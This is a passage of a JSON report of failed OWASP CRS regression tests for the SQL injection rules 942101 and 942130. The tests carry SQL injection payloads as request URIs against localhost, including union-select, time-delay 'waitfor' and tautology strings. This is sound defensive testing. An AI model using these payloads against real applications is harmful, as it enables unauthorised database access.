          "text" : " of the path. Here, libinjection will detect a true positive only if"
        }, {
          "type" : "Comment",
          "text" : " the url leading slash is considered as part of a comment block or part"
        }, {
          "type" : "Comment",
          "text" : " of a string (with a quote or double quote after it). In these circumstances,"
        }, {
          "type" : "Comment",
          "text" : " previous slashes do not affect libinjection result, making it able to detect"
        }, {
          "type" : "Comment",
          "text" : " some SQLi inside the path."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BASENAME"
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942101
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 1
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942101",
    "test_id" : 3,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942101.yaml",
    "description" : "Simple SQL injection",
    "cause" : "failed expect_id check: 942101 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920180 - POST without Content-Length and Transfer-Encoding headers" ]
    },
    "test" : {
      "test_id" : 3,
      "desc" : "Simple SQL injection",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post/EmptyValue'%20and%20526=527",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942101 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942101,
      "phase" : 1,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is a sibling of rule 942100 that adds checking of the path."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " REQUEST_BASENAME provides the last url segment (slash excluded)."
        }, {
          "type" : "Comment",
          "text" : " This segment is the most likely to be used for injections. Stripping out"
        }, {
          "type" : "Comment",
          "text" : " the slash permits libinjection to do not consider it as a payload starting"
        }, {
          "type" : "Comment",
          "text" : " with not unary arithmetical operators (not a valid SQL command, e.g."
        }, {
          "type" : "Comment",
          "text" : " '/9 union all'). The latter would lead to do not detect malicious payloads."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " REQUEST_FILENAME matches SQLi payloads inside (or across) other segments"
        }, {
          "type" : "Comment",
          "text" : " of the path. Here, libinjection will detect a true positive only if"
        }, {
          "type" : "Comment",
          "text" : " the url leading slash is considered as part of a comment block or part"
        }, {
          "type" : "Comment",
          "text" : " of a string (with a quote or double quote after it). In these circumstances,"
        }, {
          "type" : "Comment",
          "text" : " previous slashes do not affect libinjection result, making it able to detect"
        }, {
          "type" : "Comment",
          "text" : " some SQLi inside the path."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BASENAME"
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942101
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 1
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942101",
    "test_id" : 4,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942101.yaml",
    "description" : "Advanced SQL injection",
    "cause" : "failed expect_id check: 942101 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920180 - POST without Content-Length and Transfer-Encoding headers" ]
    },
    "test" : {
      "test_id" : 4,
      "desc" : "Advanced SQL injection",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post/foo')waitfor%20delay'5%3a0%3a20'--",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942101 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942101,
      "phase" : 1,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is a sibling of rule 942100 that adds checking of the path."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " REQUEST_BASENAME provides the last url segment (slash excluded)."
        }, {
          "type" : "Comment",
          "text" : " This segment is the most likely to be used for injections. Stripping out"
        }, {
          "type" : "Comment",
          "text" : " the slash permits libinjection to do not consider it as a payload starting"
        }, {
          "type" : "Comment",
          "text" : " with not unary arithmetical operators (not a valid SQL command, e.g."
        }, {
          "type" : "Comment",
          "text" : " '/9 union all'). The latter would lead to do not detect malicious payloads."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " REQUEST_FILENAME matches SQLi payloads inside (or across) other segments"
        }, {
          "type" : "Comment",
          "text" : " of the path. Here, libinjection will detect a true positive only if"
        }, {
          "type" : "Comment",
          "text" : " the url leading slash is considered as part of a comment block or part"
        }, {
          "type" : "Comment",
          "text" : " of a string (with a quote or double quote after it). In these circumstances,"
        }, {
          "type" : "Comment",
          "text" : " previous slashes do not affect libinjection result, making it able to detect"
        }, {
          "type" : "Comment",
          "text" : " some SQLi inside the path."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BASENAME"
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942101
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 1
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942101",
    "test_id" : 7,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942101.yaml",
    "description" : "SQL Injection at the last segment of the path (request_basename detection)",
    "cause" : "failed expect_id check: 942101 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920180 - POST without Content-Length and Transfer-Encoding headers" ]
    },
    "test" : {
      "test_id" : 7,
      "desc" : "SQL Injection at the last segment of the path (request_basename detection)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post/foo/24'union+all+select+1,2,3+from+aa",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942101 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942101,
      "phase" : 1,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is a sibling of rule 942100 that adds checking of the path."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " REQUEST_BASENAME provides the last url segment (slash excluded)."
        }, {
          "type" : "Comment",
          "text" : " This segment is the most likely to be used for injections. Stripping out"
        }, {
          "type" : "Comment",
          "text" : " the slash permits libinjection to do not consider it as a payload starting"
        }, {
          "type" : "Comment",
          "text" : " with not unary arithmetical operators (not a valid SQL command, e.g."
        }, {
          "type" : "Comment",
          "text" : " '/9 union all'). The latter would lead to do not detect malicious payloads."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " REQUEST_FILENAME matches SQLi payloads inside (or across) other segments"
        }, {
          "type" : "Comment",
          "text" : " of the path. Here, libinjection will detect a true positive only if"
        }, {
          "type" : "Comment",
          "text" : " the url leading slash is considered as part of a comment block or part"
        }, {
          "type" : "Comment",
          "text" : " of a string (with a quote or double quote after it). In these circumstances,"
        }, {
          "type" : "Comment",
          "text" : " previous slashes do not affect libinjection result, making it able to detect"
        }, {
          "type" : "Comment",
          "text" : " some SQLi inside the path."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BASENAME"
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942101
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 1
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942101",
    "test_id" : 8,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942101.yaml",
    "description" : "SQL Injection inside the path (request_filename detection)",
    "cause" : "failed expect_id check: 942101 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920180 - POST without Content-Length and Transfer-Encoding headers" ]
    },
    "test" : {
      "test_id" : 8,
      "desc" : "SQL Injection inside the path (request_filename detection)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post/foo/24'union+all+select+1,2,3+from+aa/bar",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942101 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942101,
      "phase" : 1,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is a sibling of rule 942100 that adds checking of the path."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " REQUEST_BASENAME provides the last url segment (slash excluded)."
        }, {
          "type" : "Comment",
          "text" : " This segment is the most likely to be used for injections. Stripping out"
        }, {
          "type" : "Comment",
          "text" : " the slash permits libinjection to do not consider it as a payload starting"
        }, {
          "type" : "Comment",
          "text" : " with not unary arithmetical operators (not a valid SQL command, e.g."
        }, {
          "type" : "Comment",
          "text" : " '/9 union all'). The latter would lead to do not detect malicious payloads."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " REQUEST_FILENAME matches SQLi payloads inside (or across) other segments"
        }, {
          "type" : "Comment",
          "text" : " of the path. Here, libinjection will detect a true positive only if"
        }, {
          "type" : "Comment",
          "text" : " the url leading slash is considered as part of a comment block or part"
        }, {
          "type" : "Comment",
          "text" : " of a string (with a quote or double quote after it). In these circumstances,"
        }, {
          "type" : "Comment",
          "text" : " previous slashes do not affect libinjection result, making it able to detect"
        }, {
          "type" : "Comment",
          "text" : " some SQLi inside the path."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BASENAME"
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942101
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 1
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942101",
    "test_id" : 9,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942101.yaml",
    "description" : "SQL Injection inside the path with comment block (request_filename detection)",
    "cause" : "failed expect_id check: 942101 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ "phase=1 rule_id=920180 - POST without Content-Length and Transfer-Encoding headers" ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "SQL Injection inside the path with comment block (request_filename detection)",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "POST",
          "port" : 80,
          "uri" : "/post/%2A/%2A/2+union+all/bar",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942101 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942101,
      "phase" : 1,
      "chain" : false,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " This is a sibling of rule 942100 that adds checking of the path."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " REQUEST_BASENAME provides the last url segment (slash excluded)."
        }, {
          "type" : "Comment",
          "text" : " This segment is the most likely to be used for injections. Stripping out"
        }, {
          "type" : "Comment",
          "text" : " the slash permits libinjection to do not consider it as a payload starting"
        }, {
          "type" : "Comment",
          "text" : " with not unary arithmetical operators (not a valid SQL command, e.g."
        }, {
          "type" : "Comment",
          "text" : " '/9 union all'). The latter would lead to do not detect malicious payloads."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " REQUEST_FILENAME matches SQLi payloads inside (or across) other segments"
        }, {
          "type" : "Comment",
          "text" : " of the path. Here, libinjection will detect a true positive only if"
        }, {
          "type" : "Comment",
          "text" : " the url leading slash is considered as part of a comment block or part"
        }, {
          "type" : "Comment",
          "text" : " of a string (with a quote or double quote after it). In these circumstances,"
        }, {
          "type" : "Comment",
          "text" : " previous slashes do not affect libinjection result, making it able to detect"
        }, {
          "type" : "Comment",
          "text" : " some SQLi inside the path."
        }, {
          "type" : "Comment",
          "text" : ""
        } ]
      },
      "variables" : {
        "type" : "Variables",
        "negated" : true,
        "count" : false,
        "variables" : [ {
          "type" : "SimpleVariable",
          "name" : "REQUEST_BASENAME"
        }, {
          "type" : "SimpleVariable",
          "name" : "REQUEST_FILENAME"
        } ],
        "negated_variables" : [ ]
      },
      "operator" : {
        "type" : "Operator",
        "operator_type" : "detect_sqli",
        "value" : ""
      },
      "actions" : {
        "type" : "Actions",
        "actions" : [ {
          "type" : "Action",
          "action_type" : "id",
          "value" : 942101
        }, {
          "type" : "Action",
          "action_type" : "phase",
          "value" : 1
        }, {
          "type" : "Action",
          "action_type" : "block"
        }, {
          "type" : "Action",
          "action_type" : "capture"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "none"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "utf8toUnicode"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "urlDecodeUni"
        }, {
          "type" : "Action",
          "action_type" : "transform",
          "name" : "removeNulls"
        }, {
          "type" : "Action",
          "action_type" : "msg",
          "value" : "SQL Injection Attack Detected via libinjection"
        }, {
          "type" : "Action",
          "action_type" : "log_data",
          "value" : "Matched Data: %{TX.0} found within %{MATCHED_VAR_NAME}: %{MATCHED_VAR}"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "application-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "language-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "platform-multi"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "attack-sqli"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "paranoia-level/2"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "OWASP_CRS/ATTACK-SQLI"
        }, {
          "type" : "Action",
          "action_type" : "tag",
          "value" : "capec/1000/152/248/66"
        }, {
          "type" : "Action",
          "action_type" : "ver",
          "value" : "OWASP_CRS/4.22.0-dev"
        }, {
          "type" : "Action",
          "action_type" : "severity",
          "value" : "Critical"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.sql_injection_score=+%{tx.critical_anomaly_score}"
        }, {
          "type" : "Action",
          "action_type" : "set_var",
          "expr" : "tx.inbound_anomaly_score_pl2=+%{tx.critical_anomaly_score}"
        } ]
      }
    }
  }, {
    "test_rule" : "942130",
    "test_id" : 9,
    "test_path" : "REQUEST-942-APPLICATION-ATTACK-SQLI/942130.yaml",
    "description" : "SQL Injection Attack: SQL Tautology using MySQL NULL-safe operator <=>",
    "cause" : "failed expect_id check: 942130 not found",
    "result" : {
      "disposition" : {
        "type" : "Disposition",
        "action_type" : "continue"
      },
      "events" : [ ]
    },
    "test" : {
      "test_id" : 9,
      "desc" : "SQL Injection Attack: SQL Tautology using MySQL NULL-safe operator <=>",
      "stages" : [ {
        "input" : {
          "dest_addr" : "127.0.0.1",
          "headers" : {
            "Host" : "localhost",
            "User-Agent" : "OWASP CRS test agent",
            "Accept" : "text/xml,application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5"
          },
          "method" : "GET",
          "uri" : "/get?a=42<=>42",
          "version" : "HTTP/1.1"
        },
        "output" : {
          "log" : {
            "expect_ids" : [ 942130 ]
          }
        }
      } ]
    },
    "tested_rule" : {
      "type" : "SecRule",
      "id" : 942130,
      "phase" : 2,
      "chain" : true,
      "comment_block" : {
        "type" : "CommentBlock",
        "comments" : [ {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " -=[ SQL Tautologies ]=-"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Boolean-based SQL injection or tautology attack. Boolean values (True or False) are used to carry out"
        }, {
          "type" : "Comment",
          "text" : " this type of SQL injection. The malicious SQL query forces the web application to return a different result de-"
        }, {
          "type" : "Comment",
          "text" : " pending on whether the query returns a TRUE or FALSE result."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " The original 942130 was split in two rules:"
        }, {
          "type" : "Comment",
          "text" : " - 942130 targets tautologies using equalities (e.g. 1 = 1)"
        }, {
          "type" : "Comment",
          "text" : " - 942131 targets tautologies using inequalities (e.g. 1 != 2)"
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " We use captures to check for (in)equality in the regexp. So TX.1 will capture the left hand side (LHS) of the inequality,"
        }, {
          "type" : "Comment",
          "text" : " and TX.2 will capture the right hand side (RHS) of the logical query."
        }, {
          "type" : "Comment",
          "text" : ""
        }, {
          "type" : "Comment",
          "text" : " Regular expression generated from regex-assembly/942130.ra."
        }, {
          "type" : "Comment",
          "text" : " To update the regular expression run the following shell script"
        }, {
          "type" : "Comment",
          "text" : " (consult https://coreruleset.org/docs/development/regex_assembly/ for details):"
        }, {
          "type" : "Comment",
